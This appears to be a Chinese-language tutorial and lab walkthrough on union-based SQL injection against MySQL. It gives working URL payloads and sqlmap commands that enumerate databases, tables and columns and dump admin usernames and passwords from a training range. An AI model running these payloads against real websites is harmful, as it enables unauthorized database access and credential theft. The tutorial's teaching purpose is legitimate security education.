# SQL注入快速入门—联合注入


# SQL注入快速入门—联合注入

## 概述：

所谓的SQL注入就是通过某种方式将恶意的SQL代码添加到输入参数中，然后传递到SQL服务器使其解析并执行的一种攻击手法。

​	

## 前置知识：

### MySQL数据库：

- 需要有一些MySQL基础，需知道：**数据库**、**表**、**字段**、**数据**之间的关系、`select查询语句`(下面有)、`order by`、`and`、`group_concat()`(下面有)。

- 在 MySQL5.0 版本后，MySQL 默认在数据库中存放一个`information_schema`的数据库，在该库中，我们需要记住三个表名，分别是`schemata`，`tables`，`columns`。
  - Schemata 表**存储的是该用户创建的所有数据库的库名**，需要记住该表中记录数据库名的字段名为 `schema_name`。
  - Tables 表**存储该用户创建的所有数据库的库名和表名**，要记住该表中记录数据库 库名和表名的字段分别是 `table_schema`和 `table_name`。
  - Columns 表**存储该用户创建的所有数据库的库名、表名、字段名**，要记住该表中记录数据库库名、表名、字段名为 `table_schema`、`table_name`、`columns_name`。 


- MySQL的查询语句是```SELECT * FROM 表名 WHERE 条件; --- 从某个表查询符合某个条件的所有数据```
`*`可以换成你指定要查询的字段数据。

- `union`：MySQL中，union用于将多个select语句的结果组合到一个结果集中，并删除结果集中的重复数据。

- `group_concat()`：把数据分组连接(大概这么解释)。

- `order by 数字`：**把查询的数据按第n个字段排序。**

- `Database()`：查询当前网站使用的数据库。

[快速回忆MySQL增删改查和常见函数](https://urp1gyfvvr.feishu.cn/docx/Rjg7dmrnVoUK4IxJ1accuLatnJf)

​	

## SQL注入流程：

### SQL注入漏洞的探测方法：

1. 找到网站交互点：地址栏、搜索框、表单
   - 地址栏：某个界面的地址栏URL格式类似为`http://xxxxxxx?id=数字`则符合要求。
2. 在`id=数字`后面加单引号`'`或双引号`"`、等看看是否报错，如果报错就**可能存在** SQL注入漏洞。
3. 判断是 **“数字型”** 还是 **“字符型”** 以及 **是否存在SQL漏洞** ：
   - 在`id=数字`后面加上 `and 1=1`页面显示正常，换成 `and 1=2`页面显示错误，说明 **一定存在SQL注入** 且为 **“数学型”** 。
   - 在`id=数字`后面加上 `' and 1=1 #`页面显示正常，换成 `' and 1=2 #`页面显示错误，说明 **一定存在SQL注入** 且为 **“字符型”** 。
   - 如果都显示不正常说明不存在SQL注入漏洞(当有可能是其他情况，由于本篇只讲基础故当做不存在)。

> 如果为“字符型”，后文提到的代码都要在代码前面加上`'`、后面加上`#`。

​	

### SQL注入：

#### 1.判断页面有几个字段：

**原因：`union`前面的查询语句的字段数量和后面的查询语句字段数量要一致**

在`id=数字`后加上`order by 数字`即`id=数字 order by 数字`
> 如果是字符型则为`id=数字' order by 数学#`

意思是**把查询的数据按第n个字段排序**，如果页面上的字段大于n则会显示错误。

所以一开始可以随便`order by`一个数字，如果显示错误就减小数字，如果正常显示就增大数字。

直到你`order by n`**能正常显示**、`order by n+1`**就显示错误** ，说明n就是这个页面的字段数。

>  ps：善用二分法。

#### 3.通过联合查询查看字段在前端的回显位置：
  对于一个网页，如果它的字段数是3，但可能只有第1，2字段的数据返回页面前端。所以我们需要查询哪个字段会回显，得用`union select `联合查询来查看字段在前端的回显位置

    id=数字 and 1=2 union select 1,2
    ---或者
    id=不存在的数字 union select 1,2,3

`and 1=2`或者`id=不存在的数字`：使前一句的SQL语句为错误
> 不存在的数字：假如一个网页有`id=1`的页面和`id=2`的页面，改成`id=-1`(除了1和2的其他数字都行)，就没有相对应的页面显示；`and 1=2`也是同理。

> 之所以让前半句出错是因为程序在展示数据的时候通常只会取结果集的第一行数据，只要让第一行查询的结果是空集，即`union`左边的`select子句`查询结果为空，那么`union`右边的查询结果自然就成为了第一行，打印在网页上了

`union select 1,2,3`：联合查询，让第一个字段显示“1”、第二个字段显示“2”、第三个字段显示“3”，从而来找可以回显的字段在页面的位置

#### 4.查询目标数据库名：
在得到字段数之后就可以查询数据库名。

查询数据库名的函数是`database()`。

假设我们已经找到某个可回显字段的位置(比如显示“2”的字段)，记住这个字段位置，在地址栏输入：

    http://xxxxxxx?id=1 and 1=2 union select 1,database(),3


#### 5.查询目标数据库名里的所有表名：

    http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = "目标数据库名"

- 在 MySQL5.0 版本后，MySQL 默认在数据库中存放一个`information_schema`的数据库。

- `information_schema`数据库里有个`tables`表。

- `tables`表里有`table_schema`和`table_name`字段。

- `table_schema`字段存的是网站管理员创建的所有数据库的库名。

- `table_name`字段存的是网站管理员创建的所有数据库的表名。

这句代码的意思是从`information_schema`数据库里的`tables`表里找`table_schema`字段里的数据为 **目标数据库名** 所对应的`table_name`字段里的数据，即查询 **目标数据库名内的所有表名**。

`group_concat(table_name)`：将查询到的表名用`,`连起来。

#### 6.查询目标表名内的所有字段名

    http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name = "目标表名"

#### 7.查询目标字段名内的数据

    http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(目标字段名),3 from 目标表名

如果要一次性查询多个字段内的数据：

    http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(字段名1,";",字段名2,";",字段名3),3 from 目标表名

`;`用来分隔多个字段名内的数据

​	

## 拓展实战：

### 手工注入：

这是一个SQL注入的靶场，目标是找到“flag”

<img src="https://pic1.imgdb.cn/item/646f1050f024cca1735aec3a.png"  />

首先我们要去找到交互点，这个界面的交互点只有最上面的地址栏，但没有类似`http://xxxxxxx?id=数字`，没法做SQL注入。

所以要先找到地址栏有类似于`id=数字`这样的界面

可以看到这里有个**查看新闻**的按钮

<img src="https://pic1.imgdb.cn/item/646f11ecf024cca1735e3427.jpg"  />

点进去之后看到地址栏出现了我们期待的`?id=1`，接下来就是测试这个交互点（地址栏）是否存在SQL注入了！

<img src="https://pic1.imgdb.cn/item/646f1268f024cca1735f35ba.jpg"  />

上文有提到SQL注入的流程，首先我们在`1`后面加个 `‘`，即`http://pu2lh35s.ia.aqlab.cn/?id=1'`，访问后发现页面出错了（内容没了）

![](https://pic1.imgdb.cn/item/646f136cf024cca173615e4b.jpg)

接着我们再试试在后面加上 `and 1=1`，即`http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=1`，可以看到页面照常显示

![](https://pic1.imgdb.cn/item/646f1403f024cca1736267a4.jpg)

到这里就说明了地址栏这个交互点存在SQL注入

接着是判断页面有几个字段

地址栏输入：

```
http://pu2lh35s.ia.aqlab.cn/?id=1 order by 2
```

回车后页面正常显示：

![](https://pic1.imgdb.cn/item/646f6c1df024cca173f09157.jpg)

地址栏输入：

```
http://pu2lh35s.ia.aqlab.cn/?id=1 order by 3
```

回车后页面显示错误：

![](https://pic1.imgdb.cn/item/646f6cf9f024cca173f1de97.jpg)

由此可以断定当前页面有2个回显字段

接下来是通过联合查询查看字段在前端的回显位置

地址栏输入：

```
http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=2 union select 1,2
```

回车后页面显示：

![](https://pic1.imgdb.cn/item/646f6da2f024cca173f2cd65.jpg)

说明圈起来的那个字段是可利用的回显字段

接下来是利用这个字段来查询当前页面的数据库名

```
http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=2 union select 1,database()
```

回车后的页面：

![](https://pic1.imgdb.cn/item/646f6e8bf024cca173f44560.jpg)

得到了数据库名 `maoshe` 

接下来是查询数据库 `maoshe`里有哪些表名

地址栏输入：

```
http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema = "maoshe"
```

 回车后的页面：

![](https://pic1.imgdb.cn/item/646f6f66f024cca173f5942c.jpg)

得到了 `maoshe` 数据库下的所有表名： `admin`,`dirs`,`news`,`xss`

根据经验，`admin`表（admin意思是管理员）里肯定有“好东西”

> 当然，可以每个表都查一遍

现在来查询`admin`表里有哪些字段

地址栏里输入：

```
http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name = "admin"
```

回车后的页面：

![](https://pic1.imgdb.cn/item/646f70c3f024cca173f7ac96.jpg)

得到了 `admin`表下的所有字段名： `Id`,`username`,`password`

根据经验，`password`字段和`username`字段里肯定有“好东西”（`username`意思是用户名、`password`意思是密码）

> 当然，也可以去看看其他的字段里存什么数据

现在来查询`password`字段和`username`字段里有啥数据

地址栏里输入：

```
http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=2 union select 1,group_concat(username) from admin
```

```
http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=2 union select 1,group_concat(password) from admin
```

回车后的页面：

![](https://pic1.imgdb.cn/item/646f730df024cca173fb5863.jpg)

![](https://pic1.imgdb.cn/item/646f738cf024cca173fc34a4.jpg)

获取到了`username`：**admin**、`password`：**hellohack,zkaqbanban**

把**hellohack,zkaqbanban**拿去提交结果是错误的，给我看傻了好久，于是乎我把数据库里的所有表里的所有字段都翻了一遍，并没有所谓的“flag”

我就在想不会是要拿着用户名密码去**登后台**吧，我又用`dirsearch` 把网站的目录扫了一遍，并没有发现所谓的**后台登陆界面**

实在没办法我就把**hellohack**拿去提交，结果就正确了（雾）。

​	

### 使用工具sqlmap注入：

首先还是得先找到地址栏（URL）类似为：`http://xxxxxxx?id=数字`的页面

点击**查看新闻**的按钮

![](https://pic1.imgdb.cn/item/646f11ecf024cca1735e3427.jpg)

点完之后的URL为：`http://pu2lh35s.ia.aqlab.cn/?id=1`,符合要求

![](https://pic1.imgdb.cn/item/646f1268f024cca1735f35ba.jpg)



打开sqlmap，输入：

```
python sqlmap.py -u "http://pu2lh35s.ia.aqlab.cn/?id=1" --dbs
```

这一步是扫出网站数据库名

结果如下：

![](https://pic1.imgdb.cn/item/6472b97ff024cca17306c56f.jpg)

从sqlmap扫到的数据库名来看我们得到了三个数据库名：

- `information_schema`
- `maoshe`
- `test`



文章开头提到的，在 MySQL5.0 版本后，MySQL 默认在数据库中存放一个`information_schema`的数据库

`test`数据库是MySQL系统默认安装时自带的一个数据库名，它通常用于进行测试和示例目的，而不是用于实际的生产环境

于是我们得到了网站的数据库名为：` maoshe`

> 与之前手工注入的结果一样



接下来要去扫`maoshe`数据库下的表名，输入：

```
python sqlmap.py -u "http://pu2lh35s.ia.aqlab.cn/?id=1" -D maoshe --tables
```

结果如下：

![](https://pic1.imgdb.cn/item/6472bd3df024cca1730a7469.jpg)

从sqlmap扫到的数据库名来看我们得到了四个数据表名：

- `admin`
- `dirs`
- `news`
- `xss`



接下来是查询`admin`表下有哪些字段名，输入：

```
python sqlmap.py -u "http://pu2lh35s.ia.aqlab.cn/?id=1" -D maoshe -T admin --columns
```

结果如下：

![](https://pic1.imgdb.cn/item/6472c186f024cca17310f399.jpg)

从sqlmap扫到的字段(列)名来看我们得到了四个字段名：

- `Id`
- `username`
- `password`





接下来是查询`password`字段里存放的数据，输入：

```
python sqlmap.py -u "http://pu2lh35s.ia.aqlab.cn/?id=1" -D maoshe -T admin -C password --dump
```

结果如下：

![](https://pic1.imgdb.cn/item/6472c1e9f024cca1731152a3.jpg)

sqlmap扫到`password`字段里存放的数据为：

`hellohack zkaqbanban`

​	

​	

**参考文章：**
http://t.csdn.cn/3SJAU
https://zhuanlan.zhihu.com/p/397815893
http://t.csdn.cn/DTTTa

